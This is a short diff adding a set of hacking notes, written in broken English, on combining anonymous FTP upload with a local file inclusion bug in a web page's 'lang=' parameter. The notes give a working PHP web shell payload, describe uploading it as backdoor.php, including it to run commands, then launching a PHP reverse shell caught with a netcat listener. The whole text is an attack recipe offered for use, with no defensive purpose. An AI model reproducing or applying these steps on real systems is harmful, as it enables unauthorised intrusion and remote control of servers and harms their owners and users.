@@ -1,0 +1,29 @@
+if ftp port and login anonymous allowed 
+you check all of them possibility to hack able but not hacked system so you try this step maybe hacked 
+
+1. if url like this : exmple.com/blablabla/lang=blablabla 
+
+then you try this 
+
+2. example.com/blablabla/lang=/var/ftp/vsftp.conf
+
+if working then creat a maliciaus php file 
+
+and use this php payload for lfi exploit
+
+<?php system($_GET['cmd']); ?> 
+
+3. login ftp and try to put backdoor.php = cmd shell try
+
+and then
+
+4. example.com/blablabla/lang=/var/ftp/backdoor.php&cmd=id
+
+if working then access system able with lfi vulnerability
+
+
+5. /backdoor.php&cmd=(php reverse shell ) 
+
+6. nc -lvnp port
+
+hacked 
